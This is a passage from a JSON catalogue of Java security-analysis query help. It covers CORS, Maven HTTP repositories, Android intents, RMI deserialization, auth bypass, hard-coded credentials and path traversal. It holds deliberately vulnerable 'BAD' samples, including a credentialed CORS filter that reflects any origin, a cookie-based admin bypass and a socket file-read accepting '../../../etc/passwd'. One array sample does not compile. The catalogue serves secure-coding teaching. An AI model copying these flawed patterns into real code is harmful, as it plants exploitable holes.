allowed origins for such a Cross-Origin request.\n\n\n```java\nimport java.io.IOException;\n\nimport javax.servlet.Filter;\nimport javax.servlet.FilterChain;\nimport javax.servlet.FilterConfig;\nimport javax.servlet.ServletException;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\nimport org.apache.commons.lang3.StringUtils;\n\npublic class CorsFilter implements Filter {\n    public void init(FilterConfig filterConfig) throws ServletException {}\n\n    public void doFilter(ServletRequest req, ServletResponse res,\n            FilterChain chain) throws IOException, ServletException {\n        HttpServletRequest request = (HttpServletRequest) req;\n        HttpServletResponse response = (HttpServletResponse) res;\n        String url = request.getHeader(\"Origin\");\n\n        if (!StringUtils.isEmpty(url)) {\n            String val = response.getHeader(\"Access-Control-Allow-Origin\");\n\n            if (StringUtils.isEmpty(val)) {\n                response.addHeader(\"Access-Control-Allow-Origin\", url); // BAD -> User controlled CORS header being set here.\n                response.addHeader(\"Access-Control-Allow-Credentials\", \"true\");\n            }\n        }\n\n        if (!StringUtils.isEmpty(url)) {\n            List<String> checkorigins = Arrays.asList(\"www.example.com\", \"www.sub.example.com\");\n\n            if (checkorigins.contains(url)) { // GOOD -> Origin is validated here.\n                response.addHeader(\"Access-Control-Allow-Origin\", url);\n                response.addHeader(\"Access-Control-Allow-Credentials\", \"true\");\n            }\n        }\n\n        chain.doFilter(req, res);\n    }\n\n    public void destroy() {}\n}\n\n```\n\n## References\n* Mozilla Developer Network: [CORS, Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin).\n* Mozilla Developer Network: [CORS, Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials).\n* PortSwigger: [Exploiting CORS Misconfigurations for Bitcoins and Bounties](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)\n* W3C: [CORS for developers, Advice for Resource Owners](https://w3c.github.io/webappsec-cors-for-developers/#resources)\n* Common Weakness Enumeration: [CWE-346](https://cwe.mitre.org/data/definitions/346.html).\n"
  },
  "java/maven/non-https-url": {
    "name": "Failure to use HTTPS or SFTP URL in Maven artifact upload/download",
    "description": "Non-HTTPS connections can be intercepted by third parties.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 8.1,
    "precision": "very-high",
    "id": "java/maven/non-https-url",
    "tags": [
      "security",
      "external/cwe/cwe-300",
      "external/cwe/cwe-319",
      "external/cwe/cwe-494",
      "external/cwe/cwe-829"
    ],
    "filename": "645e12c0-InsecureDependencyResolution",
    "language": "java",
    "help": "# Failure to use HTTPS or SFTP URL in Maven artifact upload/download\nUsing an insecure protocol like HTTP or FTP to download your dependencies leaves your Maven build vulnerable to a [Man in the Middle (MITM)](https://en.wikipedia.org/wiki/Man-in-the-middle_attack). This can allow attackers to inject malicious code into the artifacts that you are resolving and infect build artifacts that are being produced. This can be used by attackers to perform a [Supply chain attack](https://en.wikipedia.org/wiki/Supply_chain_attack) against your project's users.\n\nThis vulnerability has a [ CVSS v3.1 base score of 8.1/10 ](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1).\n\n\n## Recommendation\nAlways use HTTPS or SFTP to download artifacts from artifact servers.\n\n\n## Example\nThese examples show examples of locations in Maven POM files where artifact repository upload/download is configured. The first shows the use of HTTP, the second shows the use of HTTPS.\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\">\n\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>com.semmle</groupId>\n    <artifactId>parent</artifactId>\n    <version>1.0</version>\n    <packaging>pom</packaging>\n\n    <name>Security Testing</name>\n    <description>An example of insecure download and upload of dependencies</description>\n\n    <distributionManagement>\n        <repository>\n            <id>insecure-releases</id>\n            <name>Insecure Repository Releases</name>\n            <!-- BAD! Use HTTPS -->\n            <url>http://insecure-repository.example</url>\n        </repository>\n        <snapshotRepository>\n            <id>insecure-snapshots</id>\n            <name>Insecure Repository Snapshots</name>\n            <!-- BAD! Use HTTPS -->\n            <url>http://insecure-repository.example</url>\n        </snapshotRepository>\n    </distributionManagement>\n    <repositories>\n        <repository>\n            <id>insecure</id>\n            <name>Insecure Repository</name>\n            <!-- BAD! Use HTTPS -->\n            <url>http://insecure-repository.example</url>\n        </repository>\n    </repositories>\n    <pluginRepositories>\n        <pluginRepository>\n            <id>insecure-plugins</id>\n            <name>Insecure Repository Releases</name>\n            <!-- BAD! Use HTTPS -->\n            <url>http://insecure-repository.example</url>\n        </pluginRepository>\n    </pluginRepositories>\n</project>\n\n```\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd\">\n\n    <modelVersion>4.0.0</modelVersion>\n\n    <groupId>com.semmle</groupId>\n    <artifactId>parent</artifactId>\n    <version>1.0</version>\n    <packaging>pom</packaging>\n\n    <name>Security Testing</name>\n    <description>An example of secure download and upload of dependencies</description>\n\n    <distributionManagement>\n        <repository>\n            <id>insecure-releases</id>\n            <name>Secure Repository Releases</name>\n            <!-- GOOD! Use HTTPS -->\n            <url>https://insecure-repository.example</url>\n        </repository>\n        <snapshotRepository>\n            <id>insecure-snapshots</id>\n            <name>Secure Repository Snapshots</name>\n            <!-- GOOD! Use HTTPS -->\n            <url>https://insecure-repository.example</url>\n        </snapshotRepository>\n    </distributionManagement>\n    <repositories>\n        <repository>\n            <id>insecure</id>\n            <name>Secure Repository</name>\n            <!-- GOOD! Use HTTPS -->\n            <url>https://insecure-repository.example</url>\n        </repository>\n    </repositories>\n    <pluginRepositories>\n        <pluginRepository>\n            <id>insecure-plugins</id>\n            <name>Secure Repository Releases</name>\n            <!-- GOOD! Use HTTPS -->\n            <url>https://insecure-repository.example</url>\n        </pluginRepository>\n    </pluginRepositories>\n</project>\n\n```\n\n## References\n* Research: [ Want to take over the Java ecosystem? All you need is a MITM! ](https://medium.com/bugbountywriteup/want-to-take-over-the-java-ecosystem-all-you-need-is-a-mitm-1fc329d898fb?source=friends_link&sk=3c99970c55a899ad9ef41f126efcde0e)\n* Research: [ How to take over the computer of any Java (or Closure or Scala) Developer. ](https://max.computer/blog/how-to-take-over-the-computer-of-any-java-or-clojure-or-scala-developer/)\n* Proof of Concept: [ mveytsman/dilettante ](https://github.com/mveytsman/dilettante)\n* Additional Gradle &amp; Maven plugin: [ Announcing nohttp ](https://spring.io/blog/2019/06/10/announcing-nohttp)\n* Java Ecosystem Announcement: [ HTTP Decommission Artifact Server Announcements ](https://gist.github.com/JLLeitschuh/789e49e3d34092a005031a0a1880af99)\n* Common Weakness Enumeration: [CWE-300](https://cwe.mitre.org/data/definitions/300.html).\n* Common Weakness Enumeration: [CWE-319](https://cwe.mitre.org/data/definitions/319.html).\n* Common Weakness Enumeration: [CWE-494](https://cwe.mitre.org/data/definitions/494.html).\n* Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).\n"
  },
  "java/android/sensitive-communication": {
    "name": "Leaking sensitive information through an implicit Intent",
    "description": "An Android application uses implicit Intents containing sensitive data in a way that exposes it to arbitrary applications on the device.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.2,
    "precision": "medium",
    "id": "java/android/sensitive-communication",
    "tags": [
      "security",
      "external/cwe/cwe-927"
    ],
    "filename": "fb706418-SensitiveCommunication",
    "language": "java",
    "help": "# Leaking sensitive information through an implicit Intent\nWhen an implicit Intent is used with a method such as `startActivity`, `startService`, or `sendBroadcast`, it may be read by other applications on the device.\n\nThis means that sensitive data in these Intents may be leaked.\n\n\n## Recommendation\nFor `sendBroadcast` methods, a receiver permission may be specified so that only applications with a certain permission may receive the Intent; or a `LocalBroadcastManager` may be used. Otherwise, ensure that Intents containing sensitive data have an explicit receiver class set.\n\n\n## Example\nThe following example shows two ways of broadcasting Intents. In the 'BAD' case, no \"receiver permission\" is specified. In the 'GOOD' case, \"receiver permission\" or \"receiver application\" is specified.\n\n\n```java\npublic void sendBroadcast1(Context context, String token, String refreshToken) \n{\n    {\n        // BAD: broadcast sensitive information to all listeners\n        Intent intent = new Intent();\n        intent.setAction(\"com.example.custom_action\");\n        intent.putExtra(\"token\", token);\n        intent.putExtra(\"refreshToken\", refreshToken);\n        context.sendBroadcast(intent);\n    }\n\n    {\n        // GOOD: broadcast sensitive information only to those with permission\n        Intent intent = new Intent();\n        intent.setAction(\"com.example.custom_action\");\n        intent.putExtra(\"token\", token);\n        intent.putExtra(\"refreshToken\", refreshToken);\n        context.sendBroadcast(intent, \"com.example.user_permission\");\n    }\n\n    {\n        // GOOD: broadcast sensitive information to a specific application\n        Intent intent = new Intent();\n        intent.setAction(\"com.example.custom_action\");\n        intent.setClassName(\"com.example2\", \"com.example2.UserInfoHandler\");\n        intent.putExtra(\"token\", token);\n        intent.putExtra(\"refreshToken\", refreshToken);\n        context.sendBroadcast(intent);\n    }\n}\n```\n\n## References\n* Android Developers: [Security considerations and best practices for sending and receiving broadcasts](https://developer.android.com/guide/components/broadcasts)\n* SonarSource: [Broadcasting intents is security-sensitive](https://rules.sonarsource.com/java/type/Security%20Hotspot/RSPEC-5320)\n* Android Developer Fundamentals: [Restricting broadcasts](https://google-developer-training.github.io/android-developer-fundamentals-course-concepts-v2/unit-3-working-in-the-background/lesson-7-background-tasks/7-3-c-broadcasts/7-3-c-broadcasts.html)\n* Carnegie Mellon University: [DRD03-J. Do not broadcast sensitive information using an implicit intent](https://wiki.sei.cmu.edu/confluence/display/android/DRD03-J.+Do+not+broadcast+sensitive+information+using+an+implicit+intent)\n* Android Developers: [Android LiveData Overview](https://developer.android.com/topic/libraries/architecture/livedata)\n* Oversecured: [Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)\n* Common Weakness Enumeration: [CWE-927](https://cwe.mitre.org/data/definitions/927.html).\n"
  },
  "java/unsafe-deserialization-rmi": {
    "name": "Unsafe deserialization in a remotely callable method.",
    "description": "If a registered remote object has a method that accepts a complex object, an attacker can take advantage of the unsafe deserialization mechanism which is used to pass parameters in RMI. In the worst case, it results in remote code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/unsafe-deserialization-rmi",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-502"
    ],
    "filename": "094f8cd6-UnsafeDeserializationRmi",
    "language": "java",
    "help": "# Unsafe deserialization in a remotely callable method.\nJava RMI uses the default Java serialization mechanism (in other words, `ObjectInputStream`) to pass parameters in remote method invocations. This mechanism is known to be unsafe when deserializing untrusted data. If a registered remote object has a method that accepts a complex object, an attacker can take advantage of the unsafe deserialization mechanism. In the worst case, it results in remote code execution.\n\n\n## Recommendation\nUse only strings and primitive types for parameters of remotely invokable methods.\n\nSet a filter for incoming serialized data by wrapping remote objects using either `UnicastRemoteObject.exportObject(Remote, int, ObjectInputFilter)` or `UnicastRemoteObject.exportObject(Remote, int, RMIClientSocketFactory, RMIServerSocketFactory, ObjectInputFilter)` methods. Those methods accept an `ObjectInputFilter` that decides which classes are allowed for deserialization. The filter should allow deserializing only safe classes.\n\nIt is also possible to set a process-wide deserialization filter. The filter can be set by with `ObjectInputFilter.Config.setSerialFilter(ObjectInputFilter)` method, or by setting system or security property `jdk.serialFilter`. Make sure that you use the latest Java versions that include JEP 290. Please note that the query is not sensitive to this mitigation.\n\nIf switching to the latest Java versions is not possible, consider using other implementations of remote procedure calls. For example, HTTP API with JSON. Make sure that the underlying deserialization mechanism is properly configured so that deserialization attacks are not possible.\n\n\n## Example\nThe following code registers a remote object with a vulnerable method that accepts a complex object:\n\n\n```java\npublic class Server {\n    public void bindRemoteObject(Registry registry) throws Exception {\n        registry.bind(\"unsafe\", new RemoteObjectImpl());\n    }\n}\n\ninterface RemoteObject extends Remote {\n    void action(Object obj) throws RemoteException;\n}\n\nclass RemoteObjectImpl implements RemoteObject {\n    // ...\n}\n```\nThe next example registers a safe remote object whose methods use only primitive types and strings:\n\n\n```java\npublic class Server {\n    public void bindRemoteObject(Registry registry) throws Exception {\n        registry.bind(\"safe\", new RemoteObjectImpl());\n    }\n}\n\ninterface RemoteObject extends Remote {\n    void calculate(int a, double b) throws RemoteException;\n    void save(String s) throws RemoteException;\n}\n\nclass RemoteObjectImpl implements RemoteObject {\n    // ...\n}\n```\nThe next example shows how to set a deserialization filter for a remote object:\n\n\n```java\npublic void bindRemoteObject(Registry registry, int port) throws Exception {\n    ObjectInputFilter filter = info -> {\n        if (info.serialClass().getCanonicalName().startsWith(\"com.safe.package.\")) {\n            return ObjectInputFilter.Status.ALLOWED;\n        }\n        return ObjectInputFilter.Status.REJECTED;\n    };\n    registry.bind(\"safer\", UnicastRemoteObject.exportObject(new RemoteObjectImpl(), port, filter));\n}\n\n```\n\n## References\n* Oracle: [Remote Method Invocation (RMI)](https://www.oracle.com/java/technologies/javase/remote-method-invocation-home.html).\n* ITNEXT: [Java RMI for pentesters part two - reconnaissance &amp; attack against non-JMX registries](https://itnext.io/java-rmi-for-pentesters-part-two-reconnaissance-attack-against-non-jmx-registries-187a6561314d).\n* MOGWAI LABS: [Attacking Java RMI services after JEP 290](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290)\n* OWASP: [Deserialization of untrusted data](https://www.owasp.org/index.php/Deserialization_of_untrusted_data).\n* OpenJDK: [JEP 290: Filter Incoming Serialization Data](https://openjdk.java.net/jeps/290)\n* Common Weakness Enumeration: [CWE-502](https://cwe.mitre.org/data/definitions/502.html).\n"
  },
  "java/user-controlled-bypass": {
    "name": "User-controlled bypass of sensitive method",
    "description": "User-controlled bypassing of sensitive methods may allow attackers to avoid passing through authentication systems.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.8,
    "precision": "medium",
    "id": "java/user-controlled-bypass",
    "tags": [
      "security",
      "external/cwe/cwe-807",
      "external/cwe/cwe-290"
    ],
    "filename": "6c70950b-ConditionalBypass",
    "language": "java",
    "help": "# User-controlled bypass of sensitive method\nMany Java constructs enable code statements to be executed conditionally, for example `if` statements and `for` statements. If these statements contain important authentication or login code, and the decision about whether to execute this code is based on user-controlled data, it may be possible for an attacker to bypass security systems by preventing this code from executing.\n\n\n## Recommendation\nNever decide whether to authenticate a user based on data that may be controlled by that user. If necessary, ensure that the data is validated extensively when it is input before any authentication checks are performed.\n\nIt is still possible to have a system that \"remembers\" users, thus not requiring the user to login on every interaction. For example, personalization settings can be applied without authentication because this is not sensitive information. However, users should be allowed to take sensitive actions only when they have been fully authenticated.\n\n\n## Example\nThis example shows two ways of deciding whether to authenticate a user. The first way shows a decision that is based on the value of a cookie. Cookies can be easily controlled by the user, and so this allows a user to become authenticated without providing valid credentials. The second, more secure way shows a decision that is based on looking up the user in a security database.\n\n\n```java\npublic boolean doLogin(String user, String password) {\n\tCookie adminCookie = getCookies()[0];\n\n\t// BAD: login is executed only if the value of 'adminCookie' is 'false', \n\t// but 'adminCookie' is controlled by the user\n\tif(adminCookie.getValue()==\"false\")\n\t\treturn login(user, password);\n\t\n\treturn true;\n}\n\npublic boolean doLogin(String user, String password) {\n\tCookie adminCookie = getCookies()[0];\n\t\n\t// GOOD: use server-side information based on the credentials to decide\n\t// whether user has privileges\n\tboolean isAdmin = queryDbForAdminStatus(user, password);\n\tif(!isAdmin)\n\t\treturn login(user, password);\n\t\n\treturn true;\n}\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [SEC02-J. Do not base security checks on untrusted sources](https://wiki.sei.cmu.edu/confluence/display/java/SEC02-J.+Do+not+base+security+checks+on+untrusted+sources).\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n"
  },
  "java/thread-resource-abuse": {
    "name": "Uncontrolled thread resource consumption",
    "description": "Using user input directly to control a thread's sleep time could lead to performance problems or even resource exhaustion.",
    "kind": "path-problem",
    "id": "java/thread-resource-abuse",
    "problem.severity": "warning",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-400"
    ],
    "filename": "708900a6-ThreadResourceAbuse",
    "language": "java",
    "help": "# Uncontrolled thread resource consumption\nThe `Thread.sleep` method is used to pause the execution of current thread for specified time. When the sleep time is user-controlled, especially in the web application context, it can be abused to cause all of a server's threads to sleep, leading to denial of service.\n\n\n## Recommendation\nTo guard against this attack, consider specifying an upper range of allowed sleep time or adopting the producer/consumer design pattern with `Object.wait` method to avoid performance problems or even resource exhaustion. For more information, refer to the concurrency tutorial of Oracle listed below or `java/ql/src/Likely Bugs/Concurrency` queries of CodeQL.\n\n\n## Example\nThe following example shows a bad situation and a good situation respectively. In the bad situation, a thread sleep time comes directly from user input. In the good situation, an upper range check on the maximum sleep time allowed is enforced.\n\n\n```java\nclass SleepTest {\n\tpublic void test(int userSuppliedWaitTime) throws Exception {\n\t\t// BAD: no boundary check on wait time\n\t\tThread.sleep(userSuppliedWaitTime);\n\n\t\t// GOOD: enforce an upper limit on wait time\n\t\tif (userSuppliedWaitTime > 0 && userSuppliedWaitTime < 5000) {\n\t\t\tThread.sleep(userSuppliedWaitTime);\n\t\t}\n\t}\n}\n\n```\n\n## References\n* Snyk: [Denial of Service (DoS) in com.googlecode.gwtupload:gwtupload](https://snyk.io/vuln/SNYK-JAVA-COMGOOGLECODEGWTUPLOAD-569506).\n* gwtupload: [\\[Fix DOS issue\\] Updating the AbstractUploadListener.java file](https://github.com/manolo/gwtupload/issues/33).\n* The blog of a gypsy engineer: [ CVE-2019-17555: DoS via Retry-After header in Apache Olingo](https://blog.gypsyengineer.com/en/security/cve-2019-17555-dos-via-retry-after-header-in-apache-olingo.html).\n* Oracle: [The Java Concurrency Tutorials](https://docs.oracle.com/javase/tutorial/essential/concurrency/guardmeth.html)\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "java/partial-path-traversal-from-remote": {
    "name": "Partial path traversal vulnerability from remote",
    "description": "A prefix used to check that a canonicalised path falls within another must be slash-terminated.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.3,
    "precision": "high",
    "id": "java/partial-path-traversal-from-remote",
    "tags": [
      "security",
      "external/cwe/cwe-023"
    ],
    "filename": "42984bd8-PartialPathTraversalFromRemote",
    "language": "java",
    "help": "# Partial path traversal vulnerability from remote\nA common way to check that a user-supplied path `SUBDIR` falls inside a directory `DIR` is to use `getCanonicalPath()` to remove any path-traversal elements and then check that `DIR` is a prefix. However, if `DIR` is not slash-terminated, this can unexpectedly allow accessing siblings of `DIR`.\n\nSee also `java/partial-path-traversal`, which is similar to this query, but may also flag non-remotely-exploitable instances of partial path traversal vulnerabilities.\n\n\n## Recommendation\nIf the user should only access items within a certain directory `DIR`, ensure that `DIR` is slash-terminated before checking that `DIR` is a prefix of the user-provided path, `SUBDIR`. Note, Java's `getCanonicalPath()` returns a **non**-slash-terminated path string, so a slash must be added to `DIR` if that method is used.\n\n\n## Example\nIn this example, the `if` statement checks if `parent.getCanonicalPath()` is a prefix of `dir.getCanonicalPath()`. However, `parent.getCanonicalPath()` is not slash-terminated. This means that users that supply `dir` may be also allowed to access siblings of `parent` and not just children of `parent`, which is a security issue.\n\n\n```java\npublic class PartialPathTraversalBad {\n    public void example(File dir, File parent) throws IOException {\n        if (!dir.getCanonicalPath().startsWith(parent.getCanonicalPath())) {\n            throw new IOException(\"Path traversal attempt: \" + dir.getCanonicalPath());\n        }\n    }\n}\n\n```\nIn this example, the `if` statement checks if `parent.toPath()` is a prefix of `dir.normalize()`. Because `Path#startsWith` does the correct check that `dir` is a child of `parent`, users will not be able to access siblings of `parent`, as desired.\n\n\n```java\nimport java.io.File;\n\npublic class PartialPathTraversalGood {\n    public void example(File dir, File parent) throws IOException {\n        if (!dir.toPath().normalize().startsWith(parent.toPath())) {\n            throw new IOException(\"Path traversal attempt: \" + dir.getCanonicalPath());\n        }\n    }\n}\n\n```\n\n## References\n* OWASP: [Partial Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* CVE-2022-23457: [ ESAPI Vulnerability Report](https://github.com/ESAPI/esapi-java-legacy/blob/develop/documentation/GHSL-2022-008_The_OWASP_Enterprise_Security_API.md).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n"
  },
  "java/toctou-race-condition": {
    "name": "Time-of-check time-of-use race condition",
    "description": "Using a resource after an unsynchronized state check can lead to a race condition, if the state may be changed between the check and use.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.7,
    "precision": "medium",
    "id": "java/toctou-race-condition",
    "tags": [
      "security",
      "external/cwe/cwe-367"
    ],
    "filename": "ff7281fe-TOCTOURace",
    "language": "java",
    "help": "# Time-of-check time-of-use race condition\nOften it is necessary to check the state of a resource before using it. If the resource is accessed concurrently, then the check and the use need to be performed atomically, otherwise the state of the resource may change between the check and the use. This can lead to a \"time-of-check/time-of-use\" (TOCTOU) race condition.\n\nIn Java, classes may present state inspection methods and operation methods which are synchronized. This prevents multiple threads from executing those methods simultaneously, but it does not prevent a state change in between separate method invocations.\n\n\n## Recommendation\nWhen calling a series of methods which require a consistent view of an object, make sure to synchronize on a monitor that will prevent any other access to the object during your operations.\n\nIf the class that you are using has a well-designed interface, then synchronizing on the object itself will prevent its state being changed inappropriately.\n\n\n## Example\nThe following example shows a resource which has a readiness state, and an action that is only valid if the resource is ready.\n\nIn the bad case, the caller checks the readiness state and then acts, but does not synchronize around the two calls, so the readiness state may be changed by another thread.\n\nIn the good case, the caller jointly synchronizes the check and the use on the resource, so no other thread can modify the state before the use.\n\n\n```java\nclass Resource {\n\tpublic synchronized boolean isReady() { ... }\n\n\tpublic synchronized void setReady(boolean ready) { ... }\n\t\n\tpublic synchronized void act() { \n\t\tif (!isReady())\n\t\t\tthrow new IllegalStateException();\n\t\t...\n\t}\n}\n\t\npublic synchronized void bad(Resource r) {\n\tif (r.isReady()) {\n\t\t// r might no longer be ready, another thread might\n\t\t// have called setReady(false)\n\t\tr.act();\n\t}\n}\n\npublic synchronized void good(Resource r) {\n\tsynchronized(r) {\n\t\tif (r.isReady()) {\n\t\t\tr.act();\n\t\t}\n\t}\n}\n```\n\n## References\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n"
  },
  "java/improper-validation-of-array-construction-code-specified": {
    "name": "Improper validation of code-specified size used for array construction",
    "description": "Using a code-specified value that may be zero as the argument to a construction of an array can lead to index out of bound exceptions.",
    "kind": "path-problem",
    "problem.severity": "recommendation",
    "security-severity": 8.8,
    "precision": "medium",
    "id": "java/improper-validation-of-array-construction-code-specified",
    "tags": [
      "security",
      "external/cwe/cwe-129"
    ],
    "filename": "e2275c9e-ImproperValidationOfArrayConstructionCodeSpecified",
    "language": "java",
    "help": "# Improper validation of code-specified size used for array construction\nConstructing an array using a size that may be zero can result in the creation of an empty array. If an empty array is accessed without further checks, an `ArrayIndexOutOfBoundsException` is thrown.\n\nThis can happen when a fixed value of zero, or a random value that may be zero, is used as the size directly.\n\n\n## Recommendation\nThe size used in the array initialization should be verified to be greater than zero before being used. Alternatively, the array access may be placed within a conditional that ensures it is only accessed if the index is less than the array size.\n\n\n## Example\nThe following program constructs an array with the size specified by some random value:\n\n\n```java\npublic class PossibleArrayIndexOutOfBounds {\n\n  public static void main(String[] args) {\n      int numberOfItems = new Random().nextInt(10);\n\n      if (numberOfItems >= 0) {\n        /*\n         * BAD numberOfItems may be zero, which would cause the array indexing operation to\n         * throw an ArrayIndexOutOfBoundsException\n         */\n        String items = new String[numberOfItems];\n        items[0] = \"Item 1\";\n      }\n\n      if (numberOfItems > 0) {\n        /*\n         * GOOD numberOfItems must be greater than zero, so the indexing succeeds.\n         */\n        String items = new String[numberOfItems];\n        items[0] = \"Item 1\";\n      }\n  }\n}\n```\nThe first array construction is protected by a condition that checks if the random value is zero or more. However, if the random value is `0` then an empty array is created, and any array access would fail with an `ArrayIndexOutOfBoundsException`.\n\nThe second array construction is protected by a condition that checks if the random value is greater than zero. The array will therefore never be empty, and the following array access will not throw an `ArrayIndexOutOfBoundsException`.\n\n\n## References\n* Java API Specification: [ArrayIndexOutOfBoundsException](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/ArrayIndexOutOfBoundsException.html).\n* Common Weakness Enumeration: [CWE-129](https://cwe.mitre.org/data/definitions/129.html).\n"
  },
  "java/hardcoded-credential-comparison": {
    "name": "Hard-coded credential comparison",
    "description": "Comparing a parameter to a hard-coded credential may compromise security.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "low",
    "id": "java/hardcoded-credential-comparison",
    "tags": [
      "security",
      "external/cwe/cwe-798"
    ],
    "filename": "1e2d7ec8-HardcodedCredentialsComparison",
    "language": "java",
    "help": "# Hard-coded credential comparison\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\n\n## Example\nThe following code example connects to a database using a hard-coded user name and password:\n\n\n```java\nprivate static final String p = \"123456\"; // hard-coded credential\n\npublic static void main(String[] args) throws SQLException {\n    String url = \"jdbc:mysql://localhost/test\";\n    String u = \"admin\"; // hard-coded credential\n\n    getConn(url, u, p);\n}\n\npublic static void getConn(String url, String v, String q) throws SQLException {\n    DriverManager.getConnection(url, v, q); // sensitive call\n}\n\n```\nInstead, the user name and password could be supplied through environment variables, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n"
  },
  "java/path-injection": {
    "name": "Uncontrolled data used in path expression",
    "description": "Accessing paths influenced by users can allow an attacker to access unexpected resources.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/path-injection",
    "tags": [
      "security",
      "external/cwe/cwe-022",
      "external/cwe/cwe-023",
      "external/cwe/cwe-036",
      "external/cwe/cwe-073"
    ],
    "filename": "6f72eba0-TaintedPath",
    "language": "java",
    "help": "# Uncontrolled data used in path expression\nAccessing paths controlled by users can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.\n\nPaths that are naively constructed from data controlled by a user may be absolute paths, or may contain unexpected special characters such as \"..\". Such a path could point anywhere on the file system.\n\n\n## Recommendation\nValidate user input before using it to construct a file path.\n\nCommon validation methods include checking that the normalized path is relative and does not contain any \"..\" components, or checking that the path is contained within a safe folder. The method you should use depends on how the path is used in the application, and whether the path should be a single path component.\n\nIf the path should be a single path component (such as a file name), you can check for the existence of any path separators (\"/\" or \"\\\\\"), or \"..\" sequences in the input, and reject the input if any are found.\n\nNote that removing \"../\" sequences is *not* sufficient, since the input could still contain a path separator followed by \"..\". For example, the input \".../...//\" would still result in the string \"../\" if only \"../\" sequences are removed.\n\nFinally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.\n\n\n## Example\nIn this example, a file name is read from a `java.net.Socket` and then used to access a file and send it back over the socket. However, a malicious user could enter a file name anywhere on the file system, such as \"/etc/passwd\" or \"../../../etc/passwd\".\n\n\n```java\npublic void sendUserFile(Socket sock, String user) {\n\tBufferedReader filenameReader = new BufferedReader(\n\t\t\tnew InputStreamReader(sock.getInputStream(), \"UTF-8\"));\n\tString filename = filenameReader.readLine();\n\t// BAD: read from a file without checking its path\n\tBufferedReader fileReader = new BufferedReader(new FileReader(filename));\n\tString fileLine = fileReader.readLine();\n\twhile(fileLine != null) {\n\t\tsock.getOutputStream().write(fileLine.getBytes());\n\t\tfileLine = fileReader.readLine();\n\t}\n}\n\n```\nIf the input should only be a file name, you can check that it doesn't contain any path separators or \"..\" sequences.\n\n\n```java\npublic void sendUserFileGood(Socket sock, String user) {\n\tBufferedReader filenameReader = new BufferedReader(\n\t\t\tnew InputStreamReader(sock.getInputStream(), \"UTF-8\"));\n\tString filename = filenameReader.readLine();\n\t// GOOD: ensure that the filename has no path separators or parent directory references\n\tif (filename.contains(\"..\") || filename.contains(\"/\") || filename.contains(\"\\\\\")) {\n\t\tthrow new IllegalArgumentException(\"Invalid filename\");\n\t}\n\tBufferedReader fileReader = new BufferedReader(new FileReader(filename));\n\tString fileLine = fileReader.readLine();\n\twhile(fileLine != null) {\n\t\tsock.getOutputStream().write(fileLine.getBytes());\n\t\tfileLine = fileReader.readLine();\n\t}\t\n}\n\n```\nIf the input should be within a specific directory, you can check that the resolved path is still contained within that directory.\n\n\n```java\npublic void sendUserFileGood(Socket sock, String user) {\n\tBufferedReader filenameReader = new BufferedReader(\n\t\t\tnew InputStreamReader(sock.getInputStream(), \"UTF-8\"));\n\tString filename = filenameReader.readLine();\n\n\tPath publicFolder = 